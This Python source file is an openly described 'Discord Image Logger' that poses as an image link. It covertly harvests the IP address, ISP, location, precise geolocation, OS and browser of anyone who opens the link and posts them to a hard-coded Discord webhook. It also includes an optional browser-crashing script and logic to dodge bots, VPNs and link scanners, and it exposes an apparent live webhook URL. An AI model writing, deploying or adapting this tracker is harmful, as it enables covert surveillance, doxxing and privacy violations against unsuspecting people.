# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "https://images.sampletemplates.com/wp-content/uploads/2016/03/29122813/Tic-Tac-Toe-Game-Template.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    }, timeout=3)
    except:
        pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip or ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    
    if bot:
        try:
            requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "",
        "embeds": [
            {
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }
        ],
    }, timeout=3) if config["linkAlerts"] else None
        except:
            pass
        return None

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        return None
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return None
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return None

        if config["antiBot"] == 3:
                return None

        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        os, browser = "Unknown", "Unknown"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}`
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent if useragent else 'Unknown'}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json = embed, timeout=3)
    except:
        pass
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent') or "Unknown"
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url"):
                    try:
                        url = base64.b64decode(dic.get("url").encode()).decode()
                    except:
                        url = config["image"]
                elif dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(ip, endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(ip, useragent, location, s.split("?")[0], url = url)
                    except:
                        result = makeReport(ip, useragent, endpoint = s.split("?")[0], url = url)
                else:
                    result = makeReport(ip, useragent, endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    tz = result.get("timezone", "Unknown")
                    message = message.replace("{timezone}", f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if '/' in tz else tz)
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    try:
                        os, browser = httpagentparser.simple_detect(useragent)
                        message = message.replace("{browser}", browser)
                        message = message.replace("{os}", os)
                    except:
                        pass

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            try:
                self.send_response(500)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'500 - Internal Server Error')
                reportError(traceback.format_exc())
            except:
                pass

        return
    
    def log_message(self, format, *args):
        pass
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

# Vercel Serverless Handler - FIXED
def app(request):
    """Vercel serverless handler - sends image directly"""
    try:
        from urllib.parse import urlparse, parse_qs
        import requests
        
        ip = request.headers.get('x-forwarded-for', '0.0.0.0')
        if ip:
            ip = ip.split(',')[0].strip()
        useragent = request.headers.get('user-agent', 'Unknown')
        
        # Parse query params
        parsed = urlparse(request.url)
        query_params = parse_qs(parsed.query) if parsed.query else {}
        
        url = config["image"]
        if config["imageArgument"]:
            if query_params.get("url"):
                try:
                    url = base64.b64decode(query_params.get("url")[0]).decode()
                except:
                    url = config["image"]
            elif query_params.get("id"):
                try:
                    url = base64.b64decode(query_params.get("id")[0]).decode()
                except:
                    url = config["image"]
        
        # Log the request
        makeReport(ip, useragent, endpoint=parsed.path, url=url)
        
        # Download image and send it directly
        try:
            img_response = requests.get(url, timeout=5)
            image_data = img_response.content
            content_type = img_response.headers.get('Content-Type', 'image/jpeg')
        except:
            # Fallback to empty image
            image_data = b''
            content_type = 'image/jpeg'
        
        return {
            "statusCode": 200,
            "headers": {
                "Content-Type": content_type,
                "Content-Length": str(len(image_data))
            },
            "body": image_data.decode('latin-1') if image_data else ""
        }
    
    except Exception as e:
        reportError(traceback.format_exc())
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": "<html><body>Image Logger</body></html>"
        }
